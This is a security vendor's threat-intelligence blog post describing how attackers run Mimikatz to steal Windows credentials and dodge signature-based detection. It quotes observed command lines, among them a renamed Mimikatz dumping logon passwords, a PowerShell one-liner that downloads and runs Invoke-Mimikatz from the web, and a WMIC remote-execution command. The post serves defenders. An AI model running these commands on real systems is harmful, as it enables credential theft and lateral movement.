Mimikatz in the Wild: Bypassing Signature-Based Detections Using the
“AK47 of Cyber”
April 4, 2019
Harlan Carvey From The Front Lines

This blog shares information on some examples of how the CrowdStrike® Falcon® OverWatch™
team has observed the open-source tool known as Mimikatz being used in the wild – including an
unusual use of the tool to strictly bypass brittle signature-based detections.
The OverWatch team has comprehensive levels of visibility into attempted attacks against our
customers’ infrastructures, and that visibility is extended by the shear breadth of our customer base.
This means the OverWatch team is able to observe a wide range of adversary activity from the
system visibility provided by the Falcon endpoint security platform.

Credential Access for Privilege Escalation
One frequently observed aspect of adversary activity is credential access. Actors often seek out
valid credentials in order to escalate their privileges and extend their reach within an infrastructure
— and they do so via a variety of means. In fact, the OverWatch team has previously observed
cases in which adversaries have employed multiple credential theft techniques against a single
victim. (An example of adversaries using multiple credential techniques is included in the 2018
Falcon OverWatch Report.)

Mimikatz Techniques
One popular means of credential access is the use of Mimikatz, described as the “AK47 of cyber” by
CrowdStrike Co-Founder and CTO Dmitri Alperovitch. The OverWatch team regularly sees Mimikatz
used by both targeted adversaries and pen testers.

Changing the Executable Name
The most simple and direct technique for using this tool is for the actor to copy it to a compromised
system, change the name of the executable and launch it using, for example, the following
command line:
c:\ProgramData\p.exe ""privilege::debug""
""sekurlsa::logonpasswords""

This allows the actor to access credential information on a system.

Using a Batch File
Other means of launching this tool that have been observed include using a batch file to copy the
tool over to target systems; launching the tool and sending the output to a file; copying the output
files back to a central collection point; and finally, deleting all relevant files off of the target systems.

Using a PowerShell Variant
Another means of gaining access to credential information that OverWatch analysts have observed
is the use of a PowerShell variant of Mimikatz, as seen in the following example:
powershell -ep Bypass -NoP -NonI -NoLogo -c IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent[.]com/[REDACTED]/InvokeMimikatz.ps1');Invoke-Mimikatz -Command 'privilege::debug

sekurlsa :: logonpasswords exit'

Changing Command Line Options
During the last quarter of 2018, OverWatch analysts observed a different use of the Mimikatz tool,
specifically one that appears to have been modified to change the command line options. It appears
as follows:
mnl.exe pr::dg

sl ::lp et -p

This specific variant of Mimikatz was run against multiple target systems through the use of
WMIC.exe, as illustrated below:
Wmic

/NODE:"[REDACTED]" /USER:"[REDACTED]" /password:[REDACTED] process call

create "cmd.exe /c (c:\windows\security\mnl.exe pr::dg sl ::lp et -p
>c:\windows\security\PList.txt) >> c:\windows\temp\temp.txt"

Monitoring for IOAs Is Crucial

2/5

These techniques are clearly an attempt to evade brittle detection approaches that only rely on
looking at command line options of the executable to infer its purpose, or checking for presence of
relevant strings in the binary file. While there are a number of techniques that actors can employ to
access credential information, the Falcon platform provides a level of visibility that allows defenders
to see new techniques being used, even when those techniques are specifically aimed at evading or
subverting detection mechanisms.
This further demonstrates the value of monitoring for Indicators of attack (IOAs), which focus on
behavioral aspects of attacker techniques, rather than focusing only on typical indicators of
compromise (IOCs), such as file names, hashes or single command line options.
